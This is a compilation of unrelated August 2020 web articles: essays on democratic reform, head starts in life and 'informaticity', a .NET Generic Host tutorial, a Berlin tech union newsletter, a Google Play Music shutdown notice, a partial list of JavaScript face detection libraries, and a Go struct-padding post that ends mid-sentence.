<p><span>In recent weeks, we have seen much hand wringing over the role that Social Media, Special Interests, Fake news, and Foreign Governments have played, in determining the outcomes of our political processes. To be sure, there is great merit in all of these accusations. Lobbyists should not be able to </span><a href="https://www.propublica.org/article/how-the-maker-of-turbotax-fought-free-simple-tax-filing" target="_blank" rel="noopener">veto bills that serve the public interest</a><span>. Fake news smears on Facebook should not </span><a href="https://www.theguardian.com/media/2016/dec/02/fake-news-facebook-us-election-around-the-world" target="_blank" rel="noopener">derail the campaigns of innocent politicians</a><span>. Russian propaganda should not </span><a href="https://www.nytimes.com/2018/02/18/world/europe/russia-troll-factory.html" target="_blank" rel="noopener">steer the course of American elections</a><span>.</span></p>



<p><span>But the solutions being discussed – more regulations on Facebook, censoring-by-fiat of fake news sources, more oversight into Russian clandestine activities – these solutions are all missing the point. No matter how much we regulate Social Media, it will continue to have a negative impact on political discussions. No matter how much we censor Fake News, ugly rumors will continue to spread. No matter how much effort we pour into cold-war-style covert activities to combat foreign propaganda or special interests, the other side will always find more creative ways to keep going.</span></p>



<p><span>The solutions being discussed are mere band-aids. Patches. Workarounds. An effort to duct-tape the holes in our political system in order to keep it chugging along.</span></p>



<p><span>The real problem worth examining and solving is the following: </span><i><span>Why</span></i><span> does social media play such a big role in our elections? </span><i><span>Why</span></i><span> is our political system so gullible and vulnerable to fake news? </span><i><span>Why</span></i><span> does our political system allow lobbyists and foreign actors to wield such outsized influence? Are we really so stupid that the slightest bit of misinformation and propaganda can make us vote for incompetent or malicious candidates?</span></p>



<p><span>No. We are many things but we are not stupid. We are busy – our own daily lives are an endless struggle that we wade through in order to provide for our families and put a roof over our heads. We are savants in our own domains – whether it be manufacturing, marketing, design or hospitality, we are each in the top percentile within our fields of expertise. We are eclectic in our interests – our passions span the gamut from arts to sciences. To put it simply, we don’t all have the time, expertise or interest to debate trade protectionism and single payer healthcare.</span></p>



<p><span>And yet, our current political system expects us to. Either explicitly or implicitly, we are each expected to form opinions about nearly every political issue, ranging from civil rights to tax policy to international trade to foreign policy. We are then expected to triage all of these in order of priority, and then vote for candidates who best champion our prioritized policies. </span><span>That’s a lot to ask of someone who has neither the time, expertise nor interest in doing all of the above! Nobody expects a politician to know how to milk a cow, and yet, we expect farmers to help select public policies that are best for the entire nation.&nbsp;</span></p>



<p><span>Left to make such monumental decisions with such little resources, it’s little wonder that people fall victim to all manner of subterfuge. In order to fix our political system, we need to change it at its core, in order to address the above fundamental problem.</span></p>



<p><span>Democracy is indeed </span><a href="https://richardlangworth.com/worst-form-of-government" target="_blank" rel="noopener">the worst form of government</a><span> except all the others that have been tried – and that’s certainly encouragement enough to </span><i><span>keep trying</span></i><span>. We have earlier discussed some ideas for fundamentally overhauling the way we conduct elections. One that’s </span><a href="https://outlookzen.com/2014/06/29/reinventing-democracy-the-google-way/" target="_blank" rel="noopener">sophisticated, mathematical and the stuff of science fiction</a><span>. And another’s straight out of the </span><a href="https://outlookzen.com/2014/01/21/democracy-by-jury/" target="_blank" rel="noopener">19th century’s playbook</a><span>. And these are only the start. </span></p>



<p><span>We cannot simply accept the lazy patches currently being debated in Washington. We have to continue thinking and experimenting with more fundamental changes in our political system. We cannot afford to let the past paralyze our future. The democratic experiment was a wonderful one that led to tremendous strides for our human civilization. But it’s only the first step – not the final one.</span></p>

August 13, 2020 | https://sahansera.dev/dotnet-core-generic-host/ | <a href="https://web.archive.org/web/*/https://sahansera.dev/dotnet-core-generic-host/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>In this article, we will concentrate on how the Generic Host model hosts ASP.NET Core 3.x Web app and a Worker Service. We will first discuss the definition of a <em>Host</em> and its configuration. In the subsequent sections, we will dive into the implementation details from a higher level.</p>
<h3>So what’s the deal with the Generic Host</h3>
<p>With the separation of execution and initialisation, Generic Host provides us with a cleaner way to configure and start up our apps. By default, when you create an ASP.NET Core app now, your application will be hosted using the Generic Host model. If you create a new worker service app, it will be hosted the same way.</p>
<p>Not only that, but this model also provides you standardised configuration, DI, logging, and many more. You can even create a traditional console app, beef it up and make use of Generic Host.</p>
<blockquote>
<p>💡 Follow along with the code from this <a href="https://github.com/sahan91/dotnet-generic-host-example">repository</a></p>
</blockquote>
<h3>The Host</h3>
<p>According to the official documentation, a <code>Host</code> is,</p>
<blockquote>
<p>ASP.NET Core apps configure and launch a host. The host is responsible for app startup and lifetime management. At a minimum, the host configures a server and a request processing pipeline. The host can also set up logging, dependency injection, and configuration.</p>
</blockquote>
<p>Let’s create a new .NET 3.1 WebAPI and a Worker Service project</p>
<div data-language="bash"><pre><code>dotnet new webapi -n WebApplication
dotnet new worker -n WorkerService
dotnet new sln
dotnet sln <span>add</span> WebApplication WorkerService</code></pre></div>
<p>If you open up the solution in an IDE, you will see the following project structure.</p>
<p><span>
      <span></span>
  <img alt="dotnet-core-generic-host-1.png" title="dotnet-core-generic-host-1.png" src="https://sahansera.dev/static/7574402368b68f39b8626bb1f9bc8f39/0c69d/dotnet-core-generic-host-1.png" srcset="https://sahansera.dev/static/7574402368b68f39b8626bb1f9bc8f39/772e8/dotnet-core-generic-host-1.png 200w,

https://sahansera.dev/static/7574402368b68f39b8626bb1f9bc8f39/0c69d/dotnet-core-generic-host-1.png 598w" sizes="(max-width: 598px) 100vw, 598px" loading="lazy">
    </span></p>
<p>They both have a <code>Program.cs</code> which takes care of setting up a host. In the case of the WebApplication project, it sets up a request processing pipeline defined in a <code>Startup.cs</code> and in the WorkerService project, sets a new hosted service which is an essentially an <code>IHostedService</code>.</p>
<p>In the WebApplication project, when you open up the Program.cs file, you will find the following boilerplate code has been added by the template:</p>
<div data-language="csharp"><pre><code><span>public</span> <span>static</span> <span><span>void</span></span> <span>Main</span><span>(</span><span><span>string</span><span>[</span><span>]</span></span> args<span>)</span>
<span>{</span>
    <span>CreateHostBuilder</span><span>(</span>args<span>)</span><span>.</span><span>Build</span><span>(</span><span>)</span><span>.</span><span>Run</span><span>(</span><span>)</span><span>;</span>
<span>}</span>

<span>public</span> <span>static</span> <span>IHostBuilder</span> <span>CreateHostBuilder</span><span>(</span><span><span>string</span><span>[</span><span>]</span></span> args<span>)</span> <span>=&gt;</span>
    Host<span>.</span><span>CreateDefaultBuilder</span><span>(</span>args<span>)</span>
        <span>.</span><span>ConfigureWebHostDefaults</span><span>(</span>webBuilder <span>=&gt;</span>
        <span>{</span>
            webBuilder<span>.</span><span><span>UseStartup</span><span><span>&lt;</span>Startup<span>&gt;</span></span></span><span>(</span><span>)</span><span>;</span>
        <span>}</span><span>)</span><span>;</span></code></pre></div>
<p>And, in the WorkerService project we have the following code:</p>
<div data-language="csharp"><pre><code><span>public</span> <span>static</span> <span><span>void</span></span> <span>Main</span><span>(</span><span><span>string</span><span>[</span><span>]</span></span> args<span>)</span>
<span>{</span>
    <span>CreateHostBuilder</span><span>(</span>args<span>)</span><span>.</span><span>Build</span><span>(</span><span>)</span><span>.</span><span>Run</span><span>(</span><span>)</span><span>;</span>
<span>}</span>

<span>public</span> <span>static</span> <span>IHostBuilder</span> <span>CreateHostBuilder</span><span>(</span><span><span>string</span><span>[</span><span>]</span></span> args<span>)</span> <span>=&gt;</span>
    Host<span>.</span><span>CreateDefaultBuilder</span><span>(</span>args<span>)</span>
        <span>.</span><span>ConfigureServices</span><span>(</span><span>(</span>hostContext<span>,</span> services<span>)</span> <span>=&gt;</span>
        <span>{</span>
            services<span>.</span><span><span>AddHostedService</span><span><span>&lt;</span>Worker<span>&gt;</span></span></span><span>(</span><span>)</span><span>;</span>
        <span>}</span><span>)</span><span>;</span></code></pre></div>
<p>Except for the <code>ConfigureWebHostDefaults()</code> and <code>ConfigureServices()</code>, everything else is the same.</p>
<h3>Host Configuration</h3>
<p>If you look at the <code>CreateHostBuilder</code> method in the above code, it calls a <code>CreateDefaultBuilder</code> static method from <a href="https://github.com/dotnet/runtime/blob/master/src/libraries/Microsoft.Extensions.Hosting/src/Host.cs">Host</a> coming from <a href="https://docs.microsoft.com/en-us/dotnet/api/microsoft.extensions.hosting.host.createdefaultbuilder?view=dotnet-plat-ext-3.1">Microsoft.Extensions.Hosting</a> namespace. It looks like that when we scaffold an ASP.NET Core app, it gives us a <em>.NET Generic Host</em> by default now. We used to have Web Host in ASP.NET Core 2.x, which was made deprecated since ASP.NET Core 3.0. For any future applications, it is recommended to use the .NET Generic Host.</p>
<p>This does a few things under the covers by wrapping,</p>
<ul>
<li>Dependency Injection services</li>
<li>HTTP Server implementation (such as Kestrel)</li>
<li>Logging</li>
<li>Configuration etc.</li>
</ul>
<p>In order to get an idea what the above methods do, I looked into the <a href="https://github.com/dotnet/runtime/blob/master/src/libraries/Microsoft.Extensions.Hosting/src/Host.cs">source code on Github</a>.</p>
<p>We will start off with CreateDefaultBuilder method first.</p>
<p><strong><a href="https://github.com/dotnet/runtime/blob/6072e4d3a7a2a1493f514cdf4be75a3d56580e84/src/libraries/Microsoft.Extensions.Hosting/src/Host.cs">Host.CreateDefaultBuilder()</a></strong></p>
<div data-language="csharp"><pre><code><span>public</span> <span>static</span> <span>IHostBuilder</span> <span>CreateDefaultBuilder</span><span>(</span><span><span>string</span><span>[</span><span>]</span></span> args<span>)</span>

    <span>return</span> builder<span>;</span>
<span>}</span></code></pre></div>
<p>As you can see, it pretty much configures a <code>HostBuilder</code> object and returns it. There’s nothing really specific to web hosting in here. This is why it’s common to both HTTP and non-HTTP workloads.</p>
<p>Taking a step further, let’s look at how the web host gets configured. We will now look through <code>ConfigureWebHostDefaults</code> method.</p>
<p><strong><a href="https://github.com/dotnet/aspnetcore/blob/4d4f2fe00ffa7c1b9ea08164f9f26a51a392d007/src/DefaultBuilder/src/GenericHostBuilderExtensions.cs#L26">GenericHostBuilderExtensions.ConfigureWebHostDefaults()</a></strong></p>
<div data-language="csharp"><pre><code><span>public</span> <span>static</span> <span>IHostBuilder</span> <span>ConfigureWebHostDefaults</span><span>(</span><span>this</span> <span>IHostBuilder</span> builder<span>,</span> <span>Action<span>&lt;</span>IWebHostBuilder<span>&gt;</span></span> configure<span>)</span>
<span>{</span>
    <span>return</span> builder<span>.</span><span>ConfigureWebHost</span><span>(</span>webHostBuilder <span>=&gt;</span>
    <span>{</span>
        WebHost<span>.</span><span>ConfigureWebDefaults</span><span>(</span>webHostBuilder<span>)</span><span>;</span>

        <span>configure</span><span>(</span>webHostBuilder<span>)</span><span>;</span>
    <span>}</span><span>)</span><span>;</span>
<span>}</span></code></pre></div>
<p>Remember that <code>ConfigureWebHostDefaults</code> is used only for HTTP workloads and let’s see what we get as the default web host configuration.</p>
<p><strong><a href="https://github.com/dotnet/aspnetcore/blob/4d4f2fe00ffa7c1b9ea08164f9f26a51a392d007/src/DefaultBuilder/src/WebHost.cs#L215">WebHost.ConfigureWebDefaults()</a></strong></p>
<div data-language="csharp"><pre><code><span>internal</span> <span>static</span> <span><span>void</span></span> <span>ConfigureWebDefaults</span><span>(</span><span>IWebHostBuilder</span> builder<span>)</span>
<span>{</span>
	
    builder<span>.</span><span>ConfigureAppConfiguration</span><span>(</span><span>(</span>ctx<span>,</span> cb<span>)</span> <span>=&gt;</span> <span>..</span><span>.</span> <span>)</span><span>;</span>

	
    builder<span>.</span><span>UseKestrel</span><span>(</span><span>(</span>builderContext<span>,</span> options<span>)</span> <span>=&gt;</span> <span>..</span><span>.</span> <span>)</span>

	
    <span>.</span><span>ConfigureServices</span><span>(</span><span>(</span>hostingContext<span>,</span> services<span>)</span> <span>=&gt;</span> <span>..</span><span>.</span> <span>)</span>

	
    <span>.</span><span>UseIIS</span><span>(</span><span>)</span>
    <span>.</span><span>UseIISIntegration</span><span>(</span><span>)</span><span>;</span>
<span>}</span></code></pre></div>
<p>So far, we have seen that both approaches use the same Generic Host paradigm in the two projects. If you are interested in customising the default configuration, head over to <a href="https://docs.microsoft.com/en-us/aspnet/core/fundamentals/host/generic-host?view=aspnetcore-3.1#host-configuration">Microsoft Docs’ official documentation</a>.</p>
<h3>Finally, how does it all run?</h3>
<p>Now comes the interesting part.</p>
<p>In both cases, after the configuration sections, we finally call the <code>Run()</code> on <code>IHost</code> object implemented in <code>HostingAbstractionsHostExtensions</code>. This will run the app and block the calling thread until the host is shut down. This is enabled by <code>WaitForShutdownAsync</code> which is called at the beginning of the start-up process, which can be triggered by Ctrl+C/SIGTERM or SIGINIT.</p>
<p>Let’s look at how both web hosts and worker services run.</p>
<p>For a worker service, remember how we registered our Worker class by passing it into <code>ConfigureServices</code> method. This Worker class extends <a href="https://docs.microsoft.com/en-us/dotnet/api/microsoft.extensions.hosting.backgroundservice?view=dotnet-plat-ext-3.1"><code>BackgroundService</code></a> which in turn implements <a href="https://docs.microsoft.com/en-us/dotnet/api/microsoft.extensions.hosting.ihostedservice?view=dotnet-plat-ext-3.1"><code>IHostedService</code></a>. <code>IHostedService</code> provides 2 methods, namely, <code>StartAsync</code> and <code>StopAsync</code>. So when we run our host, it must be retrieving our Worker service and invoking these methods.</p>

<p><em>Source: <a href="https://devblogs.microsoft.com/cesardelatorre/implementing-background-tasks-in-microservices-with-ihostedservice-and-the-backgroundservice-class-net-core-2-x/">Microsoft</a></em></p>
<p>In the <code>Host.cs</code> there’s a separate <code>StartAsync</code> method and we can find the following lines inside it.</p>
<div data-language="csharp"><pre><code>_hostedServices <span>=</span> Services<span>.</span><span><span>GetService</span><span><span>&lt;</span>IEnumerable<span>&lt;</span>IHostedService<span>&gt;</span><span>&gt;</span></span></span><span>(</span><span>)</span><span>;</span>

<span>foreach</span> <span>(</span><span><span>var</span></span> hostedService <span>in</span> _hostedServices<span>)</span>
<span>{</span>
    
    <span>await</span> hostedService<span>.</span><span>StartAsync</span><span>(</span>combinedCancellationToken<span>)</span><span>.</span><span>ConfigureAwait</span><span>(</span><span>false</span><span>)</span><span>;</span>
<span>}</span></code></pre></div>
<p>So our guess was correct. It certainly invokes the <code>StartAsync</code> method of <code>BackgroundService</code>, that calls <code>ExecuteAsync</code> method in which we have ultimately implemented in our <code>Worker</code> class.</p>
<p>For a web host, there’s a little bit of abstraction on top of this before it hits the above section. A summary of how it reaches this as follows;</p>
<ol>
<li>In Program.cs, configure a new webhost builder object in ConfigureWebHostDefaults</li>
<li>Register Startup class</li>
<li><code>GenericHostBuilderExtensions.ConfigureWebHostDefaults</code> method gets called</li>
<li><code>GenericHostWebHostBuilderExtensions.ConfigureWebHost</code> gets called</li>
<li>Register a <code>GenericWebHostService</code> service</li>
</ol>
<div data-language="csharp"><pre><code><span>public</span> <span>static</span> <span>IHostBuilder</span> <span>ConfigureWebHost</span><span>(</span><span>this</span> <span>IHostBuilder</span> builder<span>,</span> <span>Action<span>&lt;</span>IWebHostBuilder<span>&gt;</span></span> configure<span>)</span>
<span>{</span>
    <span><span>var</span></span> webhostBuilder <span>=</span> <span>new</span> <span>GenericWebHostBuilder</span><span>(</span>builder<span>)</span><span>;</span>
    <span>configure</span><span>(</span>webhostBuilder<span>)</span><span>;</span>
    builder<span>.</span><span>ConfigureServices</span><span>(</span><span>(</span>context<span>,</span> services<span>)</span> <span>=&gt;</span> services<span>.</span><span><span>AddHostedService</span><span><span>&lt;</span>GenericWebHostService<span>&gt;</span></span></span><span>(</span><span>)</span><span>)</span><span>;</span>
    <span>return</span> builder<span>;</span>
<span>}</span></code></pre></div>
<p>So what is a <code>GenericWebHostService</code> ? It’s an <code>IHostedService</code> 🤩. Rest of the story is as above as we looked at in the worker service scenario. Because of this nicely decoupled initialisation we are able to run both ASP.NET Core and Worker services on the Generic Host.</p>
<h3>Summary</h3>
<p>To summarise, we looked at what makes the Generic Host <em>generic</em> and dug deeper into the implementation details in .NET Github repo. We also looked at what makes an ASP.NET Core web application and a worker service different, configuration-wise. This post became a bit longer than I initially I thought it would be 😅 Nevertheless, hope you picked up a thing or two.</p>
<p>Cheers!</p>

<p>Imagine a race between two people. They are moving at the same exact speed. The only difference is that one of them got a 10-second headstart. That person has the advantage of being ahead the entire race, even though they are doing the exact same thing, moving at the exact same speed. They are always winning while the other person is always losing. Now imagine that race is not a simple sprint or even a marathon, but a race as long as life. This illustrates the unthinkable advantage of getting ahead. It is no harder for the person with the headstart to maintain their lead than it is for the person losing the entire way to maintain the distance they trail behind. In fact, it may in some cases be easier to stay ahead.</p>



<p>Another way to help illustrate this point is to look at the difference between savings and debt. Imagine two people both earn the same breakeven income to cover their same costs of living. The only difference is that one person starts with a little bit of savings and the other person starts with a little bit of debt. This small initial difference in their wealth will not only remain over time — it will actually grow much larger. The first person’s savings work for them, earning them interest over time. The second person’s debt works against them, charging them interest over time. Keep in mind, they are both earning the same income to cover the same costs of living the entire time. In this case, it is significantly easier for the person with the headstart to maintain their advantage than it is for the other person to maintain the amount by which they trail behind. Even if they both do the exact same thing over the long haul, the advantage granted by the initial headstart only increases over time.</p>



<p>This phenomenon applies in a number of other areas as well. Instead of thinking of it as the difference in a competition between two people, one can also think of it as the difference between two possible versions of oneself.</p>



<p>For example, one can lose the weight they want to lose in a relatively short period of time and then maintain a lower weight for years with no more effort than they would have needed to maintain their old heavier weight over time. All else equal, that person can enjoy the benefit of being in better shape for the rest of their life all because they put in some extra work for a short time to get down to their target weight just once.</p>



<p>This is the value of catching up and getting ahead. An early advantage can offer a lead for life. By putting in the short-term work in various areas to catch up and then get ahead, one can stay ahead in all of these areas without any more long-term effort in each, and often with less. This allows them to move on to catching up and getting ahead in other areas. The virtuous cycle continues.</p>



<p>Humans seem hardwired to always be behind. In school, kids do not do all of their assignments a week before they are due. They do them all the night before they are due. Most people tend to focus on not getting too far behind rather than on catching up and getting ahead. They fail to realize that it would often take the same or less effort to maintain a lead as it does the deficit. </p>



<p>Catching up and getting ahead is not necessarily easy, but once it is done, it is just as easy to stay ahead as it would have been to stay where one started. Catching up and getting ahead of wherever one is at the moment takes less time than that over which the benefits of doing so may be enjoyed. Get some leads in life. It is no harder and often easier to stay ahead than it is to stay behind. Why keep losing when you could just as easily keep winning? Catch up. Get ahead.</p>

<p>The world’s economy and society is starting to enter an era of INFORMATICITY, which is based upon the provision, servicing, using and billing of information services just in the same way we are used to generate, distribute, consume and pay for electricity. This is the reason for the “icity” over there in “informaticity” (informatics + icity), denoting information services as a “flow”: not as installed software in the company’s or person’s hardware infrastructure or even as software itself, when provided as services.</p>



<p>The infrastructure and means to provide such “information services as flows” is growing very fast and, at the same time, is disappearing in the background, as well as our perception of it, much in the same way electricity has disappeared in the course of dozens of years of evolution. In fact, we only notice that there is a whole complex of systems providing electricity to us when it fails somehow. And this, for the economy and society’s infrastructure at large, is how it should be. It would take us nowhere to depend upon shaky bases.</p>



<p>The same effect is starting to happen in the information economy, with consequences that might be even greater than those of electricity-as-a-service: information as a flow (or service) can be both generated and consumed globally, because the cost and loss of exchanging bits over very long distances is orders of magnitude smaller than that of moving electrons from source to sink over the same distances. This is giving rise to a number of global information services like those provided by Google and Salesforce, that are starting to have the characteristics of informaticity. In a number of cases that will be generalized over the next few years, they are starting to take over part of the roles of legacy corporate IT systems and software, as well as substituting the software boxes of old that used to serve as our personal information systems. Not only that, but they are also the information repositories of choice that we all use, more and more, day by day.</p>



<p>This represents a major change in hardware and software markets and, the more connected to the global information infrastructure is a given peripheral geography, the greater the challenge its small IT companies, in all sectors, will face from the global informaticity services. For many tiny IT companies that have survived so far providing hardware and software expertise do local and small businesses, it might be the end of the story. Even more so because of the diseconomies of scale of peripheral software markets, where it is nearly always the case that a very large number of companies develop (from scratch, usually) and provide (for a small geography and market) more or less the same few commodity &nbsp;information systems that will be made redundant as soon as that market scales (through mergers, acquisitions and the influx of foreign companies) and/or global information service providers reach such area and companies.</p>



<p>Copycat, commodity,&nbsp;<em>me too</em>&nbsp;software is being globalized by a few informaticity providers and we will most probably find a very large proportion of its current –legacy- providers out of the market soon. This is starting to happen now and is, on one side, good news for most users and small companies, both of which can benefit from world-class solutions at a smaller (sometimes zero)&nbsp; cost. On the other side, what should the software companies that are being, in a sense “globalized” do?…</p>



<p>The answer seems pretty obvious: they should look for sustainable competitive advantages. In the software and information services sector, where does that come from?… From the search for original, complex, “grand” algorithms and their implementation and deployment as global services, just like the aforementioned companies are doing. Google and Salesforce (as well as Facebook, Twitter, and parts of Apple, Amazon and Microsoft) are what we could call algorithm-based companies. Of course, most companies depend upon software to deliver most –if not all- of its goods and services these days, from aircraft manufacturers &nbsp;to the local bakery. But some depend much more than others, which is the case of the information and software companies just mentioned. And competing against information service companies which are algorithmically strong and centered is not just a matter of writing and serving a “similar” information system. For this is not an easy endeavor, as big would be competitors have discovered while trying to write a family of algorithms to match Google in search. And Google, as many others, has discovered that it is equally difficult to do the same &nbsp;for &nbsp;the “social” class of algorithms that is the core of Facebook.</p>



<p>Both Google and Facebook (and many other companies, of course) have their algorithm bases very well covered. They might still fail for other reasons, but not because someone (say Apple) would just start using their pile of cash to fund the creation of a copycat service. There is so much in terms of fundamental algorithms and solid software engineering behind –say- Google that most people that have the means for the effort of competing against it are currently investing their dimes and billions in trying to find the&nbsp;<em>next</em>&nbsp;generation of algorithms for its market. And no doubt they will, especially if Google decides to use most –if not all- of its own cash just to protect its current market, as most successful companies do (and die just because of that).</p>



<p>And so… if you are thinking of a starting a software (or software-intensive) business, waht should&nbsp;<em>you</em>&nbsp;do? Whether you are a team of two or ten, funded by tens of thousands or many millions, think twice before deciding to write just another information system of the sort that so many did trying to copy (what was then seen as) the success of Groupon. It is very unlikely that&nbsp;<em>just another implementation of a commodity information system</em>&nbsp;(JAICIS…) would be the basis for a startup that has any hope of having sustainable competitive advantages over the competition. Especially over those which are treating the algorithm core of their new business with care.</p>



<p>In countries like Brazil, due to factors like population, information market size, educational and scientific competencies and the emerging availability &nbsp;of venture capital, we can aim even higher than just asking for our startups to develop an algorithmic core that is competitive in their market. We could try to discover truly grand algorithms for serving the global informaticity market, targeting the chance of creating platforms and services that would compete not for millions but for tens, hundreds of millions of users. This is where the search for GRAAL –the grand algorithms- could lead us: to solve the problems of a sizeable percentage of a given global market and, by doing so, reap the returns while helping &nbsp;to balance the global emerging informaticity market, currently dominated by US providers.</p>

    <p>Normally, we have positive news when it comes to election staff representation called Works Councils (Betriebsräte), but this week is an exception.</p>

<h2 id="n26-retaliates-against-works-council-initiators">N26 retaliates against Works Council initiators</h2>

<p>Workers of the online bank N26 announced their intent to elect a Works Council, with electoral committee elections scheduled for Thursday and Friday (13/14th August) this week. In a public letter, N26 workers outline why they’re forming one: https://www.worker26.com/</p>

<p>Since then, management has resorted to filing a lawsuit against the initiators, barring them from continuing their duties. They are actively working with Ver.di union to fight these obvious union busting tactics, to intimidate and scare workers. Please share your support online by messaging N26 customer service, and tweeting your support for Works Council at N26.</p>

<p>On 13 August 2020, Ver.di announced they will chair the meeting, because 6 N26 employees were banned by legal injunction. An electoral committee was voted upon for N26 Operations GmbH. The following day, N26 management raised a new injunction, banning Ver.di from chairing it, so the sister union, IG Metall stepped in to chair today’s meeting. On top of that, “someone” called the police, who fortunately left after seeing there was nothing illegal happening. What would make an incredible crime novel has become part and parcel of management tactics. We will not buckle down and we will prevail in the end!</p>

<p>For live updates check out their twitter account: https://twitter.com/worker291</p>

<p><img src="https://techworkersberlin.com/static/n26_workers.557b1b12da.png" alt="N26 Works Council campaign pic, with unicorns"></p>

<h2 id="webhelp-tries-to-shut-down-works-council">Webhelp tries to shut down Works Council</h2>

<p>Webhelp Holding Germany GmbH, which is already notorious for outsourcing already has a Works Council, so management decided to make life a living hell for the elected Works Councillors, by verbally shouting at employees, withholding pay, and trying to dissolve the Works Council. This situation is so extreme, IG Metall Berlin took the rare step and filed a <a href="https://www.igmetall-berlin.de/aktuelles/meldung/webhelp-standortleiter-untergraebt-betriebsratsarbeit/">criminal complaint against Webhelp</a>.</p>

<h2 id="mozilla-fires-25-of-staff-including-in-berlin">Mozilla fires 25% of staff, including in Berlin</h2>
<p>Mozilla is known for their open source Firefox browser and Thunderbird mail client. This is the second round of layoffs at Mozilla this year, this time over 250 people lost their jobs including the entire Taipei office. To support people looking for jobs, check out #MozillaLifeBoat. This has deep ramifications for the future of the open web.</p>

<p>What’s clear is, we are winning and management is terrified of that, so they’re playing dirty. The support and expertise of IG Metal and Ver.di unions in these cases are crucial, for fighting back when needed. If you have questions about which union is right for you, you’re in the right space and am happy to discuss it with you!</p>

<p>If you are a journalist, or know someone who’s a journalist. Workers and Union representatives are available from both campaigns, please privately message back.</p>

<p>Solidarity,
Steering Committee — Berlin Tech Workers Coalition</p>

        <div><p>Over the past couple of months, we’ve been welcoming Google Play Music listeners to YouTube Music as they <a href="https://youtube.googleblog.com/2020/05/youtube-music-transfer-google-play-music-library.html">effortlessly transfer</a> their music libraries, personal taste preferences and playlists to YouTube Music. Today we're announcing two important updates. First, YouTube Music will replace Google Play Music by December 2020. Users will have the opportunity to transfer their music libraries from Google Play Music to YouTube Music in that timeframe. Second, in the coming months, Google Play Music users will no longer be able to stream from or use the Google Play Music app. Additionally, we are making changes to the Google Play store and Music Manager.&nbsp;</p><p>Starting in September 2020 in New Zealand and South Africa — and in October for all other global markets — users will no longer be able to stream from or use the Google Play Music app. But don’t worry, we will be holding onto things like your playlists, uploads, purchases, likes and more until December 2020 to make your transfer to YouTube Music easier. Users who wish to transfer their music libraries from Google Play Music to YouTube Music, can do so through December 2020, after which their Google Play Music libraries will no longer be available.</p><h2>Simple transfer and additional changes to Music Manager</h2><p>Starting in late August, users will no longer be able to purchase and pre-order music or upload and download music from Google Play Music through Music Manager.&nbsp;</p><p>To ensure users don’t lose any of their content, they’ll need to use the simple<a href="http://music.youtube.com/transfer"> transfer tool</a> to migrate any purchases over to YouTube Music or use<a href="https://takeout.google.com/"> Google Takeout</a> to export data and download their purchased and uploaded music. Once the Music Store is no longer available, users will continue to be able to upload any tracks purchased elsewhere to YouTube Music.</p><p>For Google Play listeners that have not yet started the transfer process over to YouTube Music, now’s the time. Listeners can also choose to delete their Google Play Music data, and we will clearly notify all users before they lose access to their Google Play Music library and data.</p></div>

August 13, 2020 | https://www.edopedia.com/blog/javascript-face-detection-and-recognition-libraries/ | <a href="https://web.archive.org/web/*/https://www.edopedia.com/blog/javascript-face-detection-and-recognition-libraries/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
							
<p>Face detection, recognition and tracking are revolutionary technologies that have been deployed on mobile phones, webcams, and digital cameras. With the help of this advancement in technology, we are now able to detect human faces and recognize any specific person in a crowd.</p>
<p>This is a really superb and game changer innovation that has taken the technology world by storm. Now it’s only a matter of time for face detection technology to be deployed across different web applications in different sectors.</p>
<p>In digital cameras, face detection technology is used for the purpose of autofocus; in webcams, it is used to take an instant passport-sized photograph of you; and in mobile phones, it is one measure used for the authentication of its user.</p>
<p>The future of face detection and recognition technology is very promising. This is because it is successfully used by the police and other law enforcement agencies to detect and fight crime in many countries of the world.</p>
<p>Actually, the below-mentioned libraries are using Artificial Intelligence and Machine Learning algorithms/models to detect a face. This is not a simple or straightforward task but some highly professional programmers have created different JavaScript libraries and frameworks to help us use this new technology in our web applications.</p>
<p>Now, if you are like me who is curious to learn about the actual working of these libraries. Maybe you want to create a similar JavaScript library yourself. Then, I would highly recommend you to take this <strong><a href="https://click.linksynergy.com/deeplink?id=QSpACVN268M&amp;mid=39197&amp;murl=https%3A%2F%2Fwww.udemy.com%2Fcourse%2Fmachine-learning-with-javascript%2F" target="_blank" rel="noopener noreferrer nofollow external" data-wpel-link="external">“Machine Learning with Javascript Course”</a></strong> from Udemy.</p>
<p>Over 19,000 students are already enrolled in this course. Also, it has received 4.6 stars rating from 1,900+ students. So, this course can be a life-changer for you.</p>
<p>Anyways, let’s have a look at these amazing JavaScript face detection and recognition libraries.</p>
<hr>
<h2>tracking.js</h2>
<p>This JavaScript library is packed with a deluge of algorithms and capabilities for tackling different aspects of face detection and recognition within a web browser. It works very instinctively. Face detection, recognition and color tracking are done instantly. This is one of the best JavaScript face detection and recognition libraries.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
			
<p>In past projects at <a href="https://classroom.qvault.io/">Qvault</a> we had an application that typically ran with <strong>~2GB</strong> in memory at any given time. By simply changing the order of some <code>uint</code> variables we managed to drop the memory usage to less than <strong>1.4GB</strong>. The vast majority of this allocated memory is due to an enormous slice of <code>stats</code> structs.</p>



<p>The <code>stats</code> struct has the following type definition:</p>



<pre><code lang="go">type stats struct {
	NumPosts uint8
	Reach    uint16
	NumLikes uint8
}</code></pre>



<p>In theory, this struct will use a measly 4 bytes. Each <code>uint8</code> uses 1 <code>byte</code>, and the single <code>uint16</code> needs 2. We began to suspect that we had some wasteful memory issues, so I built the following little program to show how memory is being used by our struct:</p>



<pre><code lang="go">package main

import (
	"fmt"
	"reflect"
	"runtime"
)

type stats struct {
	NumPosts uint8
	Reach    uint16
	NumLikes uint8
}

func main() {
	typ := reflect.TypeOf(stats{})
	fmt.Printf("Struct is %d bytes long\n", typ.Size())
	n := typ.NumField()
	for i := 0; i &lt; n; i++ {
		field := typ.Field(i)
		fmt.Printf("%s at offset %v, size=%d, align=%d\n",
			field.Name, field.Offset, field.Type.Size(),
			field.Type.Align())
	}

	allStats := []stats{}
	for i := 0; i &lt; 100000000; i++ {
		allStats = append(allStats, stats{})
	}

	printMemUsage()
}

func printMemUsage() {
	var m runtime.MemStats
	runtime.ReadMemStats(&amp;m)
	fmt.Printf("Alloc = %v MiB", bToMb(m.Alloc))
	fmt.Printf("\tTotalAlloc = %v MiB", bToMb(m.TotalAlloc))
	fmt.Printf("\tSys = %v MiB", bToMb(m.Sys))
	fmt.Printf("\tNumGC = %v\n", m.NumGC)
}

func bToMb(b uint64) uint64 {
	return b / 1024 / 1024
}</code></pre>



<p>On my MacBook using Go 1.14.1 the above program prints:</p>



